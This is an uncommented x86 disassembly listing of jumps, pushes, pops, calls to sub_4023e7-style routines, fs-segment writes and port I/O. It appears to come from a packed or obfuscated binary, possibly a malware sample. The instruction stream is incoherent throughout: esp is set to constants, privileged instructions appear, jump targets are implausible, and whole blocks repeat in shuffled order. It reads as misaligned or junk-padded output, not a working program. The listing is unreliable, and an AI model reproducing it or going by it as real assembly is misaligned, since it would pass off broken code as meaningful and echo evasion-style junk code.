pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x5866199e
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
add [ eax ] al
jno 0xf9a7e78
sub_402484
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119aba5
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd340e
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_4024cb
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
jo 0xffffffff894f7e8c
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4024e4
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd340e
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a7e78
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_402484
add edx 0xff05e852
jne 0xffffffffc2c15288
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
jo 0xffffffff894f7e8c
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_40259f
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_40264a
jns 0xffffffff9cc1350c
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1000e2a
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_402646
jo 0xffffffffff29b407
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753338
jae r-xdata
or eax 0x15ff2875
push esi
call sub_402695
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c33601
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec1688e
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85ba570
jae r-xdata
jl 0xffffffffa1a4b8aa
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402664
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357e
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9d1
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b5
jg r-xdata
jge 0x18aac1f
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc0099c35
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe2499ee
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e963
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc646b83
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_402657
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
jae r-xdata
jpo 0x36287f5c
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fac
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402646
jge r-xdata
add esp 0x8
jge 0xffffffff874fd8c3
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59753338
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c33601
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc646b83
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec1688e
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85ba570
jae r-xdata
jl 0xffffffffa1a4b8aa
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_402657
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402664
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357e
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9d1
push esi
call sub_402695
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18aac1f
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e2a
push eax
push ecx
sub esp 0x10
call sub_402646
jo 0xffffffffff29b407
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b5
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e963
jg r-xdata
jge 0xffffffffc0099c35
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe2499ee
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
jae r-xdata
jpo 0x36287f5c
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fac
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7f71
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40281f
sub esi 0xe92e7f58
push esp
push edi
call sub_402741
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13af8c
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_40264a
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d9d1
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85ba570
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1c3b5
jns r-xdata
add ebx 0x9c575756
call sub_402664
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1357e
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c33601
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_402695
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4b8aa
jg r-xdata
jge 0x18aac1f
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc0099c35
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000e2a
push eax
push ecx
sub esp 0x10
call sub_402646
jo 0xffffffffff29b407
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753338
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe2499ee
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec1688e
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4027c3
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100aabd
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc646b83
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c21507
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e963
jge r-xdata
call sub_402657
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120aa5a
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13f16
jae r-xdata
jpo 0x36287f5c
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287fac
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4027e6
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b112
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402714
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b9b01
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
